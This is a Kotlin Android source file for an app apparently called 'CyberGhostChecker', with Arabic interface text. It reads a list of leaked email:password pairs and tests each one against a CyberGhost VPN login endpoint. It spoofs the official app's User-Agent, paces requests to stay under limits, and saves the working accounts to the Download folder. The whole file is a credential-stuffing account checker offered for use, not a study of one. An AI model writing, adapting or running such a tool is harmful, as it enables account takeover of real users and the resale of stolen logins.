package com.vanta.cgchecker

import android.content.ContentValues
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.widget.Button
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private val client by lazy {
        OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()
    }
    private val results = mutableListOf<Triple<String, String, String>>()
    private var combos: List<Pair<String, String>> = emptyList()
    private lateinit var log: TextView
    private lateinit var status: TextView

    private val pickFile = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        uri ?: return@registerForActivityResult
        val text = contentResolver.openInputStream(uri)?.bufferedReader()?.readText() ?: ""
        combos = text.lines().mapNotNull { l ->
            val s = l.trim()
            if (s.isEmpty() || s.startsWith("#")) return@mapNotNull null
            val idx = s.indexOfFirst { it == ':' || it == '|' || it == ';' }
            if (idx < 1) return@mapNotNull null
            Pair(s.substring(0, idx).trim(), s.substring(idx + 1).trim())
        }.filter { it.first.isNotEmpty() && it.second.isNotEmpty() }
        status.text = "تم تحميل " + combos.size + " حساب"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        log = findViewById(R.id.log)
        status = findViewById(R.id.status)
        findViewById<Button>(R.id.pick).setOnClickListener { pickFile.launch(arrayOf("*/*")) }
        findViewById<Button>(R.id.start).setOnClickListener { runCheck() }
    }

    private fun runCheck() {
        if (combos.isEmpty()) {
            Toast.makeText(this, "اختار ملف أولاً", Toast.LENGTH_SHORT).show()
            return
        }
        results.clear()
        log.text = ""
        lifecycleScope.launch {
            val total = combos.size
            var done = 0
            var valid = 0
            var invalid = 0
            var err = 0
            for ((email, pwd) in combos) {
                val (st, detail) = checkOne(email, pwd)
                results.add(Triple(email, pwd, st))
                when (st) {
                    "valid" -> valid++
                    "invalid" -> invalid++
                    else -> err++
                }
                done++
                status.text = "$done/$total   صح $valid   خطأ $invalid   أخطاء $err"
                log.append("$email:$pwd -> $st ($detail)\n")
                (log.parent as? ScrollView)?.let { sv ->
                    sv.post { sv.fullScroll(ScrollView.FOCUS_DOWN) }
                }
                delay(500)
            }
            saveResults()
            Toast.makeText(this@MainActivity, "خلص — اتحفظ في Download/CyberGhostChecker", Toast.LENGTH_LONG).show()
        }
    }

    private suspend fun checkOne(email: String, pwd: String): Pair<String, String> =
        withContext(Dispatchers.IO) {
            try {
                val body = JSONObject().apply { put("email", email); put("password", pwd) }.toString()
                val req = Request.Builder()
                    .url("https://api.cyberghostvpn.com/1.0/login")
                    .post(body.toRequestBody("application/json".toMediaType()))
                    .header("User-Agent", "CyberGhost/7.9.4 (Android 13)")
                    .header("Accept", "application/json")
                    .build()
                client.newCall(req).execute().use { r ->
                    val t = r.body?.string() ?: ""
                    when (r.code) {
                        in 200..201 -> {
                            val json = runCatching { JSONObject(t) }.getOrNull()
                            val keys = listOf("token", "accessToken", "access_token", "sessionToken")
                            if (json != null && keys.any { json.optString(it).isNotEmpty() }) "valid" to "ok"
                            else if (t.lowercase().contains("2fa") || t.lowercase().contains("otp")) "2fa" to "otp"
                            else "error" to "no_token"
                        }
                        401, 403 -> "invalid" to "auth"
                        429 -> "ratelimit" to "429"
                        else -> "error" to "http_" + r.code
                    }
                }
            } catch (e: Exception) {
                "error" to (e.javaClass.simpleName + ": " + (e.message ?: "net"))
            }
        }

    private suspend fun saveResults() = withContext(Dispatchers.IO) {
        results.groupBy { it.third }.forEach { (st, list) ->
            val content = list.joinToString("\n") { it.first + ":" + it.second }
            writeFile("$st.txt", content)
        }
    }

    private fun writeFile(name: String, content: String) {
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, name)
                    put(MediaStore.Downloads.MIME_TYPE, "text/plain")
                    put(MediaStore.Downloads.RELATIVE_PATH, "Download/CyberGhostChecker")
                    put(MediaStore.Downloads.IS_PENDING, 1)
                }
                val uri = contentResolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values) ?: return
                contentResolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                values.clear()
                values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                @Suppress("DEPRECATION")
                val dir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "CyberGhostChecker")
                dir.mkdirs()
                File(dir, name).writeText(content)
            }
        } catch (_: Exception) {}
    }
}
